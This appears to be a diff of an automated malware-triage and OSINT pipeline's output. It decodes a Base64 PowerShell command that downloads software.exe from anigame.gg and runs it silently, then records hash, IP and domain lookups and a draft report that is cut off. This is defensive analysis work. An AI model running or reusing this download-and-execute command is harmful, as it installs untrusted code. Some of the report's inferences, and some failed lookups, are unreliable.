@@ -2,47 +2,72 @@
 
 --- Step 1: Detection Analysis ---
 {
-  "detection_info": {
-    "file": {
-      "name": "encryptor.exe",
-      "hash": "44d88612fea8a8f36de82e1278abb02f"
-    },
-    "network": {
-      "ip_address": "13.224.189.18"
+  "Detection INformation": "Seen executing on a windows host",
+  "File Name": "software.exe",
+  "File Hash": "1d31bd48b2e864c773ca6a3b9fd0019416809066",
+  "IP Address": "13.224.189.18",
+  "Powershell": "JHNvdXJjZT0iaHR0cHM6Ly9hbmlnYW1lLmdnLi9zb2Z0d2FyZS5leGUiOyAkZGVzdD0iQzpcdG1wXHNvZnR3YXJlLmV4ZSI7ICRoYXNoPSJBQkNERUYxMjM0NTY3ODkwLi4uIjsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkc291cmNlIC1PdXRGaWxlICRkZXN0OyBpZiAoKEdldC1GaWxlSGFzaCAkZGVzdCAtQWxnb3JpdGhtIFNIQTI1NikuSGFzaCAtZXEgJGhhc2gpIHsgU3RhcnQtTXBTY2FuIC1TY2FuUGF0aCAkZGVzdCAtU2NhblR5cGUgUXVpY2tTY2FuOyBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkZGVzdCAtQXJndW1lbnRMaXN0ICIvc2lsZW50IiAtV2FpdCB9IGVsc2UgeyBXcml0ZS1FcnJvciAiSGFzaCBtaXNtYXRjaCEiIH0NCg=="
+}
+
+--- Step 1.5: Base64 Decoding ---
+{
+  "Detection INformation": "Seen executing on a windows host",
+  "File Name": "software.exe",
+  "File Hash": "1d31bd48b2e864c773ca6a3b9fd0019416809066",
+  "IP Address": "13.224.189.18",
+  "Powershell": "JHNvdXJjZT0iaHR0cHM6Ly9hbmlnYW1lLmdnLi9zb2Z0d2FyZS5leGUiOyAkZGVzdD0iQzpcdG1wXHNvZnR3YXJlLmV4ZSI7ICRoYXNoPSJBQkNERUYxMjM0NTY3ODkwLi4uIjsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkc291cmNlIC1PdXRGaWxlICRkZXN0OyBpZiAoKEdldC1GaWxlSGFzaCAkZGVzdCAtQWxnb3JpdGhtIFNIQTI1NikuSGFzaCAtZXEgJGhhc2gpIHsgU3RhcnQtTXBTY2FuIC1TY2FuUGF0aCAkZGVzdCAtU2NhblR5cGUgUXVpY2tTY2FuOyBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkZGVzdCAtQXJndW1lbnRMaXN0ICIvc2lsZW50IiAtV2FpdCB9IGVsc2UgeyBXcml0ZS1FcnJvciAiSGFzaCBtaXNtYXRjaCEiIH0NCg==",
+  "base64_decoded": [
+    {
+      "field": "Powershell",
+      "original": "JHNvdXJjZT0iaHR0cHM6Ly9hbmlnYW1lLmdnLi9zb2Z0d2FyZS5leGUiOyAkZGVzdD0iQzpcdG1wXHNvZnR3YXJlLmV4ZSI7ICRoYXNoPSJBQkNERUYxMjM0NTY3ODkwLi4uIjsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkc291cmNlIC1PdXRGaWxlICRkZXN0OyBpZiAoKEdldC1GaWxlSGFzaCAkZGVzdCAtQWxnb3JpdGhtIFNIQTI1NikuSGFzaCAtZXEgJGhhc2gpIHsgU3RhcnQtTXBTY2FuIC1TY2FuUGF0aCAkZGVzdCAtU2NhblR5cGUgUXVpY2tTY2FuOyBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkZGVzdCAtQXJndW1lbnRMaXN0ICIvc2lsZW50IiAtV2FpdCB9IGVsc2UgeyBXcml0ZS1FcnJvciAiSGFzaCBtaXNtYXRjaCEiIH0NCg==",
+      "decoded": "$source=\"https://anigame.gg./software.exe\"; $dest=\"C:\\tmp\\software.exe\"; $hash=\"ABCDEF1234567890...\"; Invoke-WebRequest -Uri $source -OutFile $dest; if ((Get-FileHash $dest -Algorithm SHA256).Hash -eq $hash) { Start-MpScan -ScanPath $dest -ScanType QuickScan; Start-Process -FilePath $dest -ArgumentList \"/silent\" -Wait } else { Write-Error \"Hash mismatch!\" }\r\n",
+      "context": "JHNvdXJjZT0iaHR0cHM6Ly9hbmlnYW1lLmdnLi9zb2Z0d2FyZS5leGUiOyAkZGVzdD0iQzpcdG1wXHNvZnR3YXJlLmV4ZSI7ICRoYXNoPSJBQkNERUYxMjM0NTY3ODkwLi4uIjsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkc291cmNlIC1PdXRGaWxlICRkZXN0OyBpZiAoKEdldC1GaWxlSGFzaCAkZGVzdCAtQWxnb3JpdGhtIFNIQTI1NikuSGFzaCAtZXEgJGhhc2gpIHsgU3RhcnQtTXBTY2FuIC1TY2FuUGF0aCAkZGVzdCAtU2NhblR5cGUgUXVpY2tTY2FuOyBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkZGVzdCAtQXJndW1lbnRMaXN0ICIvc2lsZW50IiAtV2FpdCB9IGVsc2UgeyBXcml0ZS1FcnJvciAiSGFzaCBtaXNtYXRjaCEiIH0NCg==",
+      "analysis": {
+        "1": "$source=\"https://anigame.gg./software.exe\";",
+        "1_explanation": "This line initializes a variable named 'source' and assigns it the URL of the software that is intended to be downloaded. The URL indicates that it points to an executable file, 'software.exe', hosted on the domain 'anigame.gg'. The use of 'https' suggests that the connection is encrypted, providing some level of security during the download process.",
+        "2": "$dest=\"C:\\tmp\\software.exe\";",
+        "2_explanation": "This line sets another variable named 'dest' which specifies the file path where the downloaded executable will be stored on the local system. In this case, it will be stored in the 'C:\\tmp' directory, which is typically used for temporary files. The use of double backslashes is necessary in PowerShell to escape the backslash character.",
+        "3": "$hash=\"ABCDEF1234567890...\";",
+        "3_explanation": "This line defines a variable called 'hash', which is presumably a SHA-256 hash value representing the expected hash of the downloaded executable. The '...' suggests that this hash is truncated in the output, but its purpose is to ensure the integrity of the downloaded file by comparing it against the actual hash after download.",
+        "4": "Invoke-WebRequest -Uri $source -OutFile $dest;",
+        "4_explanation": "This line uses the 'Invoke-WebRequest' cmdlet in PowerShell to download the executable file from the specified URL (stored in $source) and save it to the location indicated by $dest. This command is crucial for fetching the file from the internet.",
+        "5": "if ((Get-FileHash $dest -Algorithm SHA256).Hash -eq $hash) {",
+        "5_explanation": "This line begins a conditional statement that checks whether the SHA-256 hash of the downloaded file (obtained via 'Get-FileHash') matches the expected hash stored in the $hash variable. This is an important check to verify file authenticity and integrity, ensuring the file has not been tampered with during download.",
+        "6": "Start-MpScan -ScanPath $dest -ScanType QuickScan;",
+        "6_explanation": "If the hash matches, this line triggers a quick scan of the downloaded executable using Windows Defender (or Microsoft Defender). The 'Start-MpScan' cmdlet initiates a security scan on the specified path to identify any potential malware present in the file.",
+        "7": "Start-Process -FilePath $dest -ArgumentList \"/silent\" -Wait } else {",
+        "7_explanation": "This line, which executes only if the hash check is successful, starts the downloaded software using the 'Start-Process' cmdlet. The '/silent' argument suggests that the software should be executed without user interaction or visible prompts. The 'Wait' parameter ensures that the script waits for the process to close before continuing. The '}' indicates the end of the if statement.",
+        "8": "Write-Error \"Hash mismatch!\"",
+        "8_explanation": "This line executes if the hash check fails, meaning the downloaded file\u2019s integrity check was not successful. It logs an error message stating 'Hash mismatch!', alerting users that the file may be corrupted or altered, and therefore cannot be trusted."
+      }
     }
-  }
+  ]
 }
 
 --- Step 2: OSINT Investigation Plan ---
 {
   "step_1": {
-    "title": "Analyze File Hash with VirusTotal",
-    "description": "Retrieve and analyze the VirusTotal report for the file hash associated with the executable 'encryptor.exe' to gather information about potential threats, relationships, and previous analysis data.",
-    "ioc": "44d88612fea8a8f36de82e1278abb02f",
+    "title": "Analyze File Hash on VirusTotal",
+    "description": "Use VirusTotal to get detailed information on the file hash. This will provide insights into known malicious activities associated with the file.",
+    "ioc": "1d31bd48b2e864c773ca6a3b9fd0019416809066",
     "ioc_type": "File Hash",
     "tool": {
-      "name": "get_virustotal_report",
-      "instructions": "Use the get_virustotal_report tool with the file hash '44d88612fea8a8f36de82e1278abb02f' to retrieve detailed information and summary of detections from various antivirus engines, as well as metadata about the file."
+      "name": "get_virustotal_report"
     },
     "resources": [
       {
         "name": "VirusTotal",
         "url": "https://www.virustotal.com/"
-      },
-      {
-        "name": "Google Safety Center",
-        "url": "https://safety.google/intl/en_us/"
       }
     ]
   },
   "step_2": {
-    "title": "Check IP Reputation",
-    "description": "Investigate the reputation of the IP address 13.224.189.18 to determine if it is associated with any known malicious activity or belongs to any malicious actor.",
+    "title": "Check IP Address Reputation",
+    "description": "Verify the reputation of the IP address using available threat intelligence sources. Check for any indicators of malicious activity associated with this IP.",
     "ioc": "13.224.189.18",
     "ioc_type": "IP Address",
     "tool": {
-      "name": "check_ip_reputation",
-      "instructions": "Use the check_ip_reputation tool to assess the reputation of the IP address '13.224.189.18'. The tool will provide details regarding any malicious reports or known issues linked to this IP."
+      "name": "check_ip_reputation"
     },
     "resources": [
       {
@@ -50,109 +75,106 @@
         "url": "https://www.ipvoid.com/"
       },
       {
-        "name": "AbuseIPDB",
-        "url": "https://www.abuseipdb.com/"
+        "name": "AlienVault Open Threat Exchange (OTX)",
+        "url": "https://otx.alienvault.com/"
       }
     ]
   },
   "step_3": {
-    "title": "Geo-locate the IP Address",
-    "description": "Determine the geographical location of the IP address '13.224.189.18' to understand its origin and any potential regional threat indicators.",
+    "title": "Geolocate IP Address",
+    "description": "Determine the geographic location of the IP address to understand potential attribution or point of origin of malicious activity.",
     "ioc": "13.224.189.18",
     "ioc_type": "IP Address",
     "tool": {
-      "name": "get_geolocation",
-      "instructions": "Use the get_geolocation tool to identify the physical location associated with the IP address '13.224.189.18'. This could be useful in understanding the source and context of the threat."
+      "name": "get_geolocation"
     },
     "resources": [
       {
-        "name": "IP2Location",
-        "url": "https://www.ip2location.com/"
+        "name": "ipgeolocation",
+        "url": "https://ipgeolocation.io/"
       },
       {
-        "name": "GeoIP Tool",
-        "url": "http://geoiptool.com/"
+        "name": "MaxMind GeoIP2",
+        "url": "https://www.maxmind.com/en/geoip2-services-and-databases"
       }
     ]
   },
   "step_4": {
-    "title": "Advanced Web Search for File Hash",
-    "description": "Perform an advanced search on the internet using the file hash '44d88612fea8a8f36de82e1278abb02f' to collect any additional context or reports that may not be available through traditional threat intelligence databases.",
-    "ioc": "44d88612fea8a8f36de82e1278abb02f",
-    "ioc_type": "File Hash",
+    "title": "Investigate Domain Reputation",
+    "description": "Perform an online search to investigate the reputation and any known reports of malicious activity for the domain 'anigame.gg'.",
+    "ioc": "anigame.gg",
+    "ioc_type": "Domain",
     "tool": {
-      "name": "advanced_search",
-      "instructions": "Conduct an advanced search using the file hash '44d88612fea8a8f36de82e1278abb02f'. Summarize the information from the top 3 search results to acquire any additional insights or community discussions about the file."
+      "name": "advanced_search"
     },
     "resources": [
       {
-        "name": "Google Advanced Search",
-        "url": "https://www.google.com/advanced_search"
+        "name": "DomainTools",
+        "url": "https://www.domaintools.com/"
+      },
+      {
+        "name": "WHOIS Lookup",
+        "url": "https://whois.domaintools.com/"
       }
     ]
   },
   "step_5": {
-    "title": "Advanced Web Search for IP Address",
-    "description": "Execute an advanced search on the internet with the IP address '13.224.189.18' to gather any further context from blogs, forums, or other threat intelligence reports.",
-    "ioc": "13.224.189.18",
-    "ioc_type": "IP Address",
+    "title": "Search for Related Threat Reports",
+    "description": "Use advanced Google searches to find threat reports or news articles related to the IOCs. Summarize key findings from the top results.",
+    "ioc": "software.exe, anigame.gg, 13.224.189.18",
+    "ioc_type": "Various",
     "tool": {
-      "name": "advanced_search",
-      "instructions": "Perform an advanced search using the IP address '13.224.189.18'. Compile a concise summary of the top 3 results to uncover any discussions or additional information related to this IP."
+      "name": "advanced_search"
     },
     "resources": [
       {
-        "name": "Google Advanced Search",
-        "url": "https://www.google.com/advanced_search"
+        "name": "Google",
+        "url": "https://www.google.com/"
+      },
+      {
+        "name": "VirusTotal Community",
+        "url": "https://www.virustotal.com/gui/community"
       }
     ]
   }
 }
---- step_1: Analyze File Hash with VirusTotal ---
+--- step_1: Analyze File Hash on VirusTotal ---
 {
-  "title": "Analyze File Hash with VirusTotal",
-  "description": "Retrieve and analyze the VirusTotal report for the file hash associated with the executable 'encryptor.exe' to gather information about potential threats, relationships, and previous analysis data.",
-  "ioc": {
-    "value": "44d88612fea8a8f36de82e1278abb02f",
-    "type": "File Hash"
-  },
+  "title": "Analyze File Hash on VirusTotal",
+  "description": "Use VirusTotal to get detailed information on the file hash. This will provide insights into known malicious activities associated with the file.",
+  "ioc": "1d31bd48b2e864c773ca6a3b9fd0019416809066",
+  "ioc_type": "File Hash",
   "tool": {
-    "name": "get_virustotal_report",
-    "instructions": "Use the get_virustotal_report tool with the file hash '44d88612fea8a8f36de82e1278abb02f' to retrieve detailed information and summary of detections from various antivirus engines, as well as metadata about the file."
+    "name": "get_virustotal_report"
   },
   "resources": [
     {
       "name": "VirusTotal",
       "url": "https://www.virustotal.com/"
-    },
-    {
-      "name": "Google Safety Center",
-      "url": "https://safety.google/intl/en_us/"
     }
   ],
-  "virustotal_report": {
-    "scan_date": "2024-06-11",
-    "total_scans": 77,
-    "malicious": 67,
+  "report": {
+    "scan_date": 1719811931,
+    "total_scans": 78,
+    "malicious": 65,
     "suspicious": 0,
-    "undetected": 3,
-    "file_type": "VBA",
-    "file_size": "68 bytes",
-    "md5": "44d88612fea8a8f36de82e1278abb02f",
-    "sha1": "3395856ce81f2b7382dee72602f798b642f14140",
-    "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
+    "undetected": 9,
+    "file_type": "Win32 EXE",
+    "file_size": 212332,
+    "md5": "53f871aaecae2eabc299452bd7872f4f",
+    "sha1": "1d31bd48b2e864c773ca6a3b9fd0019416809066",
+    "sha256": "8354e3050cd540d0731cd0d5538a0bf1f9bb503bf2240a32cdc09c46aee1770c"
   }
 }
 
---- step_2: Check IP Reputation ---
+--- step_2: Check IP Address Reputation ---
 {
-  "title": "Check IP Reputation",
-  "description": "Investigate the reputation of the IP address 13.224.189.18 to determine if it is associated with any known malicious activity or belongs to any malicious actor.",
+  "title": "Check IP Address Reputation",
+  "description": "Verify the reputation of the IP address using available threat intelligence sources. Check for any indicators of malicious activity associated with this IP.",
   "ioc": "13.224.189.18",
   "ioc_type": "IP Address",
   "tool": {
-    "name": "check_ip_reputation",
-    "instructions": "Use the check_ip_reputation tool to assess the reputation of the IP address '13.224.189.18'. The tool will provide details regarding any malicious reports or known issues linked to this IP."
+    "name": "check_ip_reputation"
   },
   "resources": [
     {
@@ -160,78 +182,122 @@
       "url": "https://www.ipvoid.com/"
     },
     {
-      "name": "AbuseIPDB",
-      "url": "https://www.abuseipdb.com/"
+      "name": "AlienVault Open Threat Exchange (OTX)",
+      "url": "https://otx.alienvault.com/"
     }
   ]
 }
 
---- step_3: Geo-locate the IP Address ---
+--- step_3: Geolocate IP Address ---
 {
-  "title": "Geo-locate the IP Address",
-  "description": "Determine the geographical location of the IP address '13.224.189.18' to understand its origin and any potential regional threat indicators.",
+  "title": "Geolocate IP Address",
+  "description": "Determine the geographic location of the IP address to understand potential attribution or point of origin of malicious activity.",
   "ioc": "13.224.189.18",
   "ioc_type": "IP Address",
   "tool": {
-    "name": "get_geolocation",
-    "instructions": "Use the get_geolocation tool to identify the physical location associated with the IP address '13.224.189.18'. This could be useful in understanding the source and context of the threat."
+    "name": "get_geolocation"
   },
   "resources": [
     {
-      "name": "IP2Location",
-      "url": "https://www.ip2location.com/"
+      "name": "ipgeolocation",
+      "url": "https://ipgeolocation.io/"
     },
     {
-      "name": "GeoIP Tool",
-      "url": "http://geoiptool.com/"
+      "name": "MaxMind GeoIP2",
+      "url": "https://www.maxmind.com/en/geoip2-services-and-databases"
     }
   ]
 }
 
---- step_4: Advanced Web Search for File Hash ---
+--- step_4: Investigate Domain Reputation ---
 {
-  "title": "Advanced Web Search for File Hash",
-  "description": "Perform an advanced search on the internet using the file hash '44d88612fea8a8f36de82e1278abb02f' to collect any additional context or reports that may not be available through traditional threat intelligence databases.",
-  "ioc": "44d88612fea8a8f36de82e1278abb02f",
-  "ioc_type": "File Hash",
-  "search_results": [
+  "title": "Investigate Domain Reputation",
+  "description": "Perform an online search to investigate the reputation and any known reports of malicious activity for the domain 'anigame.gg'.",
+  "ioc": "anigame.gg",
+  "ioc_type": "Domain",
+  "tool": {
+    "name": "advanced_search"
+  },
+  "resources": [
     {
-      "summary": "The MD5 hash '44d88612fea8a8f36de82e1278abb02f' corresponds to the string 'X5O!P%@AP\\[4\\\\\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H\\\\*'. This is a known test file used for checking the efficacy of antivirus software.",
-      "source": "https://md5.gromweb.com/"
+      "name": "DomainTools",
+      "url": "https://www.domaintools.com/"
     },
     {
-      "summary": "It is noted that MD5 is a weak cryptographic hash function. While reversing it may be challenging, it is feasible using reverse dictionaries, making it inappropriate for securing sensitive information.",
-      "source": "General knowledge on MD5 weaknesses."
+      "name": "WHOIS Lookup",
+      "url": "https://whois.domaintools.com/"
+    }
+  ],
+  "search_results": {
+    "status": "No results found.",
+    "details": "An online search did not yield any results related to the reputation or malicious activity for the domain 'anigame.gg'."
+  },
+  "reputation_checks": {
+    "ip_reputation": {
+      "status": "Error",
+      "message": "Invalid IP"
+    },
+    "geolocation": {
+      "status": "Error",
+      "message": "Invalid IP"
+    }
+  }
+}
+
+--- step_5: Search for Related Threat Reports ---
+{
+  "title": "Search for Related Threat Reports",
+  "description": "Use advanced Google searches to find threat reports or news articles related to the IOCs. Summarize key findings from the top results.",
+  "ioc": "software.exe, anigame.gg, 13.224.189.18",
+  "ioc_type": "Various",
+  "results": [
+    {
+      "ioc": "software.exe",
+      "summary": {
+        "title": "Is OneLaunch Malware? : r/GeekSquad",
+        "content": "The post discusses the software 'OneLaunch' and whether it is malicious. Although it is related to the query about 'software.exe', specific details are inaccessible.",
+        "source": "Reddit",
+        "url": "https://www.reddit.com/r/GeekSquad/comments/11ab6h2/is_onelaunch_malware/"
+      }
+    },
+    {
+      "ioc": "anigame.gg",
+      "summary": {
+        "message": "No specific threat reports or news were found regarding 'anigame.gg'. The scraping process encountered restrictions on social media, leading to insufficient information.",
+        "source": "Reddit",
+        "url": "https://www.reddit.com/r/anigame/"
+      }
+    },
+    {
+      "ioc": "13.224.189.18",
+      "summary": {
+        "key_information": {
+          "domain": "cdn.boomtrain.com",
+          "location": "United States",
+          "creation_date": "March 17th, 2011",
+          "other_ip_addresses": [
+            "18.66.122.57",
+            "18.66.122.29",
+            "18.66.122.42"
+          ],
+          "recent_scans": 31,
+          "incoming_hits": "Details not specified",
+          "related_infrastructure": "List of other associated IPs and domains available",
+          "screenshots": "Several screenshots of pages hosted on the domain available"
+        },
+        "source": "urlscan.io",
+        "url": "https://urlscan.io/domain/cdn.boomtrain.com"
+      }
     }
   ],
   "resources": [
     {
-      "name": "Google Advanced Search",
-      "url": "https://www.google.com/advanced_search"
-    }
-  ]
-}
-
---- step_5: Advanced Web Search for IP Address ---
-{
-  "title": "Advanced Web Search for IP Address",
-  "description": "Execute an advanced search on the internet with the IP address '13.224.189.18' to gather any further context from blogs, forums, or other threat intelligence reports.",
-  "ioc": "13.224.189.18",
-  "ioc_type": "IP Address",
-  "tool": {
-    "name": "advanced_search",
-    "instructions": "Perform an advanced search using the IP address '13.224.189.18'. Compile a concise summary of the top 3 results to uncover any discussions or additional information related to this IP."
-  },
-  "resources": [
+      "name": "Google",
+      "url": "https://www.google.com/"
+    },
     {
-      "name": "Google Advanced Search",
-      "url": "https://www.google.com/advanced_search"
-    }
-  ],
-  "search_results": [
-    {
-      "summary": "The IP address 13.224.189.18 is part of the 13.224.189.0/24 subnet, which is within the 13.224.0.0/16 range. This information is provided by IPinfo.io.",
-      "source": "https://ipinfo.io/ips/13.224.189.0/24"
+      "name": "VirusTotal Community",
+      "url": "https://www.virustotal.com/gui/community"
     }
   ]
 }
@@ -240,47 +306,39 @@
 --- Step 3: Investigation Results ---
 {
   "step_1": {
-    "title": "Analyze File Hash with VirusTotal",
-    "description": "Retrieve and analyze the VirusTotal report for the file hash associated with the executable 'encryptor.exe' to gather information about potential threats, relationships, and previous analysis data.",
-    "ioc": {
-      "value": "44d88612fea8a8f36de82e1278abb02f",
-      "type": "File Hash"
-    },
+    "title": "Analyze File Hash on VirusTotal",
+    "description": "Use VirusTotal to get detailed information on the file hash. This will provide insights into known malicious activities associated with the file.",
+    "ioc": "1d31bd48b2e864c773ca6a3b9fd0019416809066",
+    "ioc_type": "File Hash",
     "tool": {
-      "name": "get_virustotal_report",
-      "instructions": "Use the get_virustotal_report tool with the file hash '44d88612fea8a8f36de82e1278abb02f' to retrieve detailed information and summary of detections from various antivirus engines, as well as metadata about the file."
+      "name": "get_virustotal_report"
     },
     "resources": [
       {
         "name": "VirusTotal",
         "url": "https://www.virustotal.com/"
-      },
-      {
-        "name": "Google Safety Center",
-        "url": "https://safety.google/intl/en_us/"
       }
     ],
-    "virustotal_report": {
-      "scan_date": "2024-06-11",
-      "total_scans": 77,
-      "malicious": 67,
+    "report": {
+      "scan_date": 1719811931,
+      "total_scans": 78,
+      "malicious": 65,
       "suspicious": 0,
-      "undetected": 3,
-      "file_type": "VBA",
-      "file_size": "68 bytes",
-      "md5": "44d88612fea8a8f36de82e1278abb02f",
-      "sha1": "3395856ce81f2b7382dee72602f798b642f14140",
-      "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
+      "undetected": 9,
+      "file_type": "Win32 EXE",
+      "file_size": 212332,
+      "md5": "53f871aaecae2eabc299452bd7872f4f",
+      "sha1": "1d31bd48b2e864c773ca6a3b9fd0019416809066",
+      "sha256": "8354e3050cd540d0731cd0d5538a0bf1f9bb503bf2240a32cdc09c46aee1770c"
     }
   },
   "step_2": {
-    "title": "Check IP Reputation",
-    "description": "Investigate the reputation of the IP address 13.224.189.18 to determine if it is associated with any known malicious activity or belongs to any malicious actor.",
+    "title": "Check IP Address Reputation",
+    "description": "Verify the reputation of the IP address using available threat intelligence sources. Check for any indicators of malicious activity associated with this IP.",
     "ioc": "13.224.189.18",
     "ioc_type": "IP Address",
     "tool": {
-      "name": "check_ip_reputation",
-      "instructions": "Use the check_ip_reputation tool to assess the reputation of the IP address '13.224.189.18'. The tool will provide details regarding any malicious reports or known issues linked to this IP."
+      "name": "check_ip_reputation"
     },
     "resources": [
       {
@@ -288,73 +346,122 @@
         "url": "https://www.ipvoid.com/"
       },
       {
-        "name": "AbuseIPDB",
-        "url": "https://www.abuseipdb.com/"
+        "name": "AlienVault Open Threat Exchange (OTX)",
+        "url": "https://otx.alienvault.com/"
       }
     ]
   },
   "step_3": {
-    "title": "Geo-locate the IP Address",
-    "description": "Determine the geographical location of the IP address '13.224.189.18' to understand its origin and any potential regional threat indicators.",
+    "title": "Geolocate IP Address",
+    "description": "Determine the geographic location of the IP address to understand potential attribution or point of origin of malicious activity.",
     "ioc": "13.224.189.18",
     "ioc_type": "IP Address",
     "tool": {
-      "name": "get_geolocation",
-      "instructions": "Use the get_geolocation tool to identify the physical location associated with the IP address '13.224.189.18'. This could be useful in understanding the source and context of the threat."
+      "name": "get_geolocation"
     },
     "resources": [
       {
-        "name": "IP2Location",
-        "url": "https://www.ip2location.com/"
+        "name": "ipgeolocation",
+        "url": "https://ipgeolocation.io/"
       },
       {
-        "name": "GeoIP Tool",
-        "url": "http://geoiptool.com/"
+        "name": "MaxMind GeoIP2",
+        "url": "https://www.maxmind.com/en/geoip2-services-and-databases"
       }
     ]
   },
   "step_4": {
-    "title": "Advanced Web Search for File Hash",
-    "description": "Perform an advanced search on the internet using the file hash '44d88612fea8a8f36de82e1278abb02f' to collect any additional context or reports that may not be available through traditional threat intelligence databases.",
-    "ioc": "44d88612fea8a8f36de82e1278abb02f",
-    "ioc_type": "File Hash",
-    "search_results": [
-      {
-        "summary": "The MD5 hash '44d88612fea8a8f36de82e1278abb02f' corresponds to the string 'X5O!P%@AP\\[4\\\\\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H\\\\*'. This is a known test file used for checking the efficacy of antivirus software.",
-        "source": "https://md5.gromweb.com/"
-      },
-      {
-        "summary": "It is noted that MD5 is a weak cryptographic hash function. While reversing it may be challenging, it is feasible using reverse dictionaries, making it inappropriate for securing sensitive information.",
-        "source": "General knowledge on MD5 weaknesses."
-      }
-    ],
-    "resources": [
-      {
-        "name": "Google Advanced Search",
-        "url": "https://www.google.com/advanced_search"
-      }
-    ]
-  },
-  "step_5": {
-    "title": "Advanced Web Search for IP Address",
-    "description": "Execute an advanced search on the internet with the IP address '13.224.189.18' to gather any further context from blogs, forums, or other threat intelligence reports.",
-    "ioc": "13.224.189.18",
-    "ioc_type": "IP Address",
+    "title": "Investigate Domain Reputation",
+    "description": "Perform an online search to investigate the reputation and any known reports of malicious activity for the domain 'anigame.gg'.",
+    "ioc": "anigame.gg",
+    "ioc_type": "Domain",
     "tool": {
-      "name": "advanced_search",
-      "instructions": "Perform an advanced search using the IP address '13.224.189.18'. Compile a concise summary of the top 3 results to uncover any discussions or additional information related to this IP."
+      "name": "advanced_search"
     },
     "resources": [
       {
-        "name": "Google Advanced Search",
-        "url": "https://www.google.com/advanced_search"
+        "name": "DomainTools",
+        "url": "https://www.domaintools.com/"
+      },
+      {
+        "name": "WHOIS Lookup",
+        "url": "https://whois.domaintools.com/"
       }
     ],
-    "search_results": [
+    "search_results": {
+      "status": "No results found.",
+      "details": "An online search did not yield any results related to the reputation or malicious activity for the domain 'anigame.gg'."
+    },
+    "reputation_checks": {
+      "ip_reputation": {
+        "status": "Error",
+        "message": "Invalid IP"
+      },
+      "geolocation": {
+        "status": "Error",
+        "message": "Invalid IP"
+      }
+    }
+  },
+  "step_5": {
+    "title": "Search for Related Threat Reports",
+    "description": "Use advanced Google searches to find threat reports or news articles related to the IOCs. Summarize key findings from the top results.",
+    "ioc": "software.exe, anigame.gg, 13.224.189.18",
+    "ioc_type": "Various",
+    "results": [
       {
-        "summary": "The IP address 13.224.189.18 is part of the 13.224.189.0/24 subnet, which is within the 13.224.0.0/16 range. This information is provided by IPinfo.io.",
-        "source": "https://ipinfo.io/ips/13.224.189.0/24"
+        "ioc": "software.exe",
+        "summary": {
+          "title": "Is OneLaunch Malware? : r/GeekSquad",
+          "content": "The post discusses the software 'OneLaunch' and whether it is malicious. Although it is related to the query about 'software.exe', specific details are inaccessible.",
+          "source": "Reddit",
+          "url": "https://www.reddit.com/r/GeekSquad/comments/11ab6h2/is_onelaunch_malware/"
+        }
+      },
+      {
+        "ioc": "anigame.gg",
+        "summary": {
+          "message": "No specific threat reports or news were found regarding 'anigame.gg'. The scraping process encountered restrictions on social media, leading to insufficient information.",
+          "source": "Reddit",
+          "url": "https://www.reddit.com/r/anigame/"
+        }
+      },
+      {
+        "ioc": "13.224.189.18",
+        "summary": {
+          "key_information": {
+            "domain": "cdn.boomtrain.com",
+            "location": "United States",
+            "creation_date": "March 17th, 2011",
+            "other_ip_addresses": [
+              "18.66.122.57",
+              "18.66.122.29",
+              "18.66.122.42"
+            ],
+            "recent_scans": 31,
+            "incoming_hits": "Details not specified",
+            "related_infrastructure": "List of other associated IPs and domains available",
+            "screenshots": "Several screenshots of pages hosted on the domain available"
+          },
+          "source": "urlscan.io",
+          "url": "https://urlscan.io/domain/cdn.boomtrain.com"
+        }
+      }
+    ],
+    "resources": [
+      {
+        "name": "Google",
+        "url": "https://www.google.com/"
+      },
+      {
+        "name": "VirusTotal Community",
+        "url": "https://www.virustotal.com/gui/community"
       }
     ]
   }
+}
+
+--- Step 5: Report Overview ---
+{
+  "overview": "## Cybersecurity Investigation Overview: Suspicious software.exe Execution\n\n**1. Executive Summary:**\n\nThis report analyzes a security incident involving the execution of a suspicious file, \"software.exe,\" on a Windows host. The investigation involved decoding a Base64-encoded PowerShell script, analyzing the file's hash on VirusTotal, investigating the associated IP address and domain, and searching for related threat reports. The analysis reveals a high likelihood of malicious activity, given the high VirusTotal detection rate and the obfuscated nature of the PowerShell script used for download and execution.  Further investigation is warranted to determine the exact nature of the threat and its impact.\n\n**2. Key Findings:**\n\n* **Malicious PowerShell Script:** A Base64-encoded PowerShell script was discovered.  The decoded script downloads \"software.exe\" from `anigame.gg`, calculates its SHA256 hash, compares it to a hardcoded value, performs a quick scan with Windows Defender, and then executes the file silently if the hash matches. The use of obfuscation and a hash check suggests an attempt to evade detection and ensure execution of a specific version of the malicious software.\n* **High VirusTotal Detection Rate:** The file hash (SHA1: 1d31bd48b2e864c773ca6a3b9fd0019416809066) has a high detection rate (65/78) on VirusTotal, strongly indicating malicious intent.\n* **Suspicious Domain:** The domain `anigame.gg` used to host the malicious file returned no results in reputation checks, possibly indicating a newly registered domain specifically for malicious purposes or a domain with a very low profile.\n* **Limited IP Information:** While the IP address 13.224.189.18 was flagged for investigation, the OSINT investigation yielded limited direct information about it. The provided report shows an error in processing this IP address for reputation and geolocation. However, the subsequent search for threat reports linked the IP to `cdn.boomtrain.com`, a domain located in the United States. This connection requires further scrutiny.\n* **Potentially Related Software:**  A search for \"software.exe\" yielded a discussion about \"OneLaunch\" software and its potential malicious nature. This might be a coincidence, but warrants further investigation to rule out any connection.\n\n**3. Potential Threats:**\n\n* **Malware Infection:** The high VirusTotal detection rate and the surreptitious nature of the PowerShell script strongly suggest that \"software.exe\" is malware.  The specific type of malware is unknown but could range from ransomware, spyware, or a botnet client.\n* **Data Breach:** Depending on the malware's functionality, sensitive data could be exfiltrated from the infected host.\n* **System Compromise:** The malware could compromise the host system, allowing attackers to gain control and potentially use it for further malicious activities.\n* **Lateral Movement:**  The compromised host could be used as a pivot point for attacks on other systems within the network.\n\n**4. Recommended 